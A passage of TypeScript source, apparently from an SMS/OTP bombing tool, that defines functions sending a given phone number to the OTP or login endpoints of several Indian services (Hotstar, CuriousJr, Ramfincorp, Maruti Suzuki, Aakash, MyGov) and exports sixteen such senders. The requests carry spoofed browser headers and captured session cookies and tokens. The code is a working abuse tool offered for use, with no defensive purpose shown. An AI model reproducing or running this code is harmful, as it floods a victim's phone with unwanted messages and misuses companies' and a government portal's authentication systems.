25lVmVyaWZpZWRcIjpmYWxzZSxcImRldmljZUlkXCI6XCIyMzI0MGMtNTkyNjhhLTMyYzYzOC01ZGM3MTBcIixcInByb2ZpbGVcIjpcIkFEVUxUXCIsXCJ2ZXJzaW9uXCI6XCJ2MlwiLFwic3Vic2NyaXB0aW9uc1wiOntcImluXCI6e319LFwiaXNzdWVkQXRcIjoxNzcxMjYyODYzMDIyLFwiZHBpZFwiOlwiOTBlZmQyNzNlNzllNDAxOTgzODUwYmM5YTJkYmViZTVcIixcInN0XCI6MSxcImRhdGFcIjpcIkNnUUlBQklBQ2d3SUFDSUlrQUdnemZtN3hqTUtCQWdBT2dBS0JBZ0FRZ0FLQkFnQUtnQUtCQWdBTWdBPVwifSIsImlzcyI6IlVNIiwiZXhwIjoxNzcxMzQ5MjYzLCJqdGkiOiIwM2Y2ZDVhNTliNjU0NGE0OGMwMWY1Yzc4NWFmODY5MSIsImlhdCI6MTc3MTI2Mjg2MywiYXBwSWQiOiIiLCJ0ZW5hbnQiOiIiLCJ2ZXJzaW9uIjoiMV8wIiwiYXVkIjoidW1fYWNjZXNzIn0.qCuOnalPBkbePLa6P3vctw_7N8EEYpQ9RB7GGKWW7Z8; userHID=5f86f7a5bfd942b0854068f2fccbc096; userPID=90efd273e79e401983850bc9a2dbebe5; loc=EI%2BnzcwGKAMihAIoIv78XSMqohywaXI8QUD%2F%2FcoSMEesOJivz%2B91ICb29ukaBMwIlVi7jND1GEIWbQJaCX%2B5wS9ftsMuZWra28niLriKogR2zvYURG%2BDurO5v20lE82ePCbh86ZsbrhJayfhRg4QtgmXLUgF5io901szNEw6cIdeSCWPHHgDGX2g%2BVc8uww40U8XkYW6uys2u5iHOW1XNzNZon9xcCg55EGwU9oz36TR%2BESbmDDs5M5kBOZHkf1XeA6pkuMRFv5glHfvX9SFWIwTsDhxYlBl9kfssogKHDoGKXN18kHMq81zmzWWjO0lTduoboheKaB%2BhQijBg7ia8nARRIrrsa1i1xHS8Sasg%3D%3D; x-hs-setproxystate-ud=loc; _ga=GA1.1.1280822440.1771262865; _ga_VJTFGHZ5NH=GS2.2.s1771262866$o1$g0$t1771262866$j60$l0$h0; _uetsid=cf2221400b5c11f1bfbcff7e40c8dcc2; _uetvid=cf225f600b5c11f1ac4e2da84fb59b42; _fbp=fb.1.1771262866538.418257207331224855; AK_SERVER_TIME=1771262872; _ga_2PV8LWETCX=GS2.1.s1771262866$o1$g1$t1771262876$j50$l0$h0; _ga_QV5FD29XJC=GS2.1.s1771262866$o1$g1$t1771262876$j50$l0$h0; _ga_EPJ8DYH89Z=GS2.1.s1771262866$o1$g1$t1771262883$j43$l0$h0',
				Referer: 'https://www.hotstar.com/in/mypage',
			},
			body: JSON.stringify({
				body: {
					'@type': 'type.googleapis.com/feature.login.InitiatePhoneLoginRequest',
					initiate_by: 0,
					recaptcha_token: '',
					phone_number: phone,
				},
			}),
			method: 'POST',
		},
	);
};

const curiousjr = (phone: string):Promise<Response> => {
	return fetch('https://user-auth.otpless.app/v3/lp/user/transaction/intent/5ec1a1f9-00c2-4ee2-87e0-05fff4747265', {
		headers: {
			accept: '*/*',
			'accept-language': 'en-IN,en;q=0.9',
			'content-type': 'text/plain;charset=UTF-8',
			priority: 'u=1, i',
			'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
			'sec-ch-ua-mobile': '?0',
			'sec-ch-ua-platform': '"Windows"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'cross-site',
			Referer: 'https://www.curiousjr.com/',
		},
		body: JSON.stringify({
			metadata: '{"browser":"Chrome"}',
			loginUri: 'https://www.curiousjr.com/login',
			origin: 'https://www.curiousjr.com',
			version: 'V4.2',
			deviceInfo:
				'{"userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36","platform":"Win32","vendor":"Google Inc.","browser":"Chrome","connection":"4g","language":"en-IN","cookieEnabled":true,"screenWidth":1536,"screenHeight":864,"screenColorDepth":24,"devicePixelRatio":1.25,"timezoneOffset":-330,"cpuArchitecture":"12-core","fontFamily":"\\"Times New Roman\\"","cHash":"dfcf9b16285f0455311d3f9a3e291825d92d40c17e7b7e317bec389ced232665"}',
			browser: 'Chrome',
			sdkPlatform: null,
			platform: 'Desktop',
			isLoginPage: true,
			channel: 'PHONE_INPUT',
			type: 'INPUT',
			mobile: `91${phone}`,
			selectedCountryCode: '+91',
			value: phone,
			triggerWebauthn: false,
			silentAuthEnabled: false,
			tsId: 'F86B2F19-A8A9D3F-4000-8-837A8307-00003B2B128A',
			inId: '32594144-C5C14E27-4000-8-70D062ED-00006DEC8052-019C6BEAE9B9',
			appId: 'FRP1EYAH4VBEXEAR65P9',
		}),
		method: 'POST',
	});
};

const ramfincorp = (phone: string):Promise<Response> => {
	return fetch('https://loans-api.ramfincorp.com/customers/customer-login-byMobile?utm_source=rfc4', {
		headers: {
			accept: 'application/json, text/plain, */*',
			'accept-language': 'en-IN,en;q=0.9',
			'content-type': 'application/json',
			'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
			'sec-ch-ua-mobile': '?0',
			'sec-ch-ua-platform': '"Windows"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-site',
			Referer: 'https://loans.ramfincorp.com/',
		},
		body: JSON.stringify({ mobile: phone }),
		method: 'POST',
	});
};
const marutisuzuki = (phone: string):Promise<Response> => {
	return fetch('https://www.marutisuzuki.com/app-service/api/v3/lqs/send-otp', {
		headers: {
			accept: '*/*',
			'accept-language': 'en-IN,en;q=0.9',
			'content-type': 'application/json',
			priority: 'u=1, i',
			'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
			'sec-ch-ua-mobile': '?0',
			'sec-ch-ua-platform': '"Windows"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-origin',
			cookie:
				'kndctr_BC401D6765FB06150A495FF7_AdobeOrg_identity=CiY0MDc1NTMwNDA4NzM3MTI5MTQ2NDI0MTY4MTgzODAzMTY0NjMwNlITCPusk7zGMxABGAEqBElORDEwAKAB_6yTvMYzsAEA8AH7rJO8xjM=; kndctr_BC401D6765FB06150A495FF7_AdobeOrg_cluster=ind1; AMCV_BC401D6765FB06150A495FF7%40AdobeOrg=MCMID|40755304087371291464241681838031646306; _cs_c=0; _cs_s_ctx=%7B%22firstViewTime%22%3A1771263290043%2C%22firstViewUrl%22%3A%22https%3A%2F%2Fwww.marutisuzuki.com%2F%3Fsrsltid%3DAfmBOorzRL0yAbCkqkyZ1R7TGVMcnZIS2Ln_tR72HvEzhS8Qxe4HM5Nl%22%2C%22sessionReferrer%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%7D; _gcl_au=1.1.923550559.1771263290; _fbp=fb.1.1771263290430.181834510510500442; _cs_id=298d8520-5738-a45a-e36c-9ff15c0c4b90.1771263290.1.1771263339.1771263290.1.1805427290041.1.x; _cs_s=3.5.U.9.1771265150586',
			Referer: 'https://www.marutisuzuki.com/arena/register-your-interest',
		},
		body: JSON.stringify({ mobile: phone }),
		method: 'POST',
	});
};
const aakash = (phone: string):Promise<Response> => {
	return fetch('https://antheapi.aakash.ac.in/api/generate-lead-otp', {
		headers: {
			accept: '*/*',
			'accept-language': 'en-IN,en;q=0.9',
			'cache-control': 'max-age=0',
			'content-type': 'application/json',
			priority: 'u=1, i',
			'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
			'sec-ch-ua-mobile': '?0',
			'sec-ch-ua-platform': '"Windows"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-site',
			'x-client-id': 'a6fbf1d2-27c3-46e1-b149-0380e506b763',
			Referer: 'https://www.aakash.ac.in/',
		},
		body: JSON.stringify({
			mobile_psid: phone,
			mobile_number: '',
			activity_type: 'aakash-myadmission',
			webengageData: { profile: 'student', whatsapp_opt_in: true, method: 'mobile' },
		}),
		method: 'POST',
	});
};
const mygovt = (phone: string):Promise<Response> => {
	return fetch(`https://auth.mygov.in/login_resend_otp/${phone}`, {
		headers: {
			accept: 'text/plain, */*; q=0.01',
			'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
			'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
			'sec-ch-ua-mobile': '?0',
			'sec-ch-ua-platform': '"Windows"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-origin',
			'x-requested-with': 'XMLHttpRequest',
			cookie:
				'_gid=GA1.2.1079335947.1771265528; SSESSf07e5adbc1360cbe21bfeae140bc05d2=DlbygT7qb63AMytEdZT2sVlSqV1_uPECCcYiDkziLkQ; _ga_GQNNN9RDK4=GS2.1.s1771265527$o1$g1$t1771265702$j60$l0$h0; client_id=1; _ga=GA1.1.2086898820.1771265528; _ga_PFPR2GEDW8=GS2.1.s1771265703$o1$g1$t1771265785$j60$l0$h0',
			Referer: 'https://auth.mygov.in/user/login?destination=oauth2/authorize',
		},
		body: null,
		method: 'GET',
	});
};
export default {
	unacademy,
	ajio,
	// growwid,
	kukufm,
	allen,
	eurekaforbes,
	bharatloan,
	nobroker,
	jiomart,
	zestmoney,
	zeeott,
	jiohotstar,
	curiousjr,
	ramfincorp,
	marutisuzuki,
	aakash,
	mygovt,
};
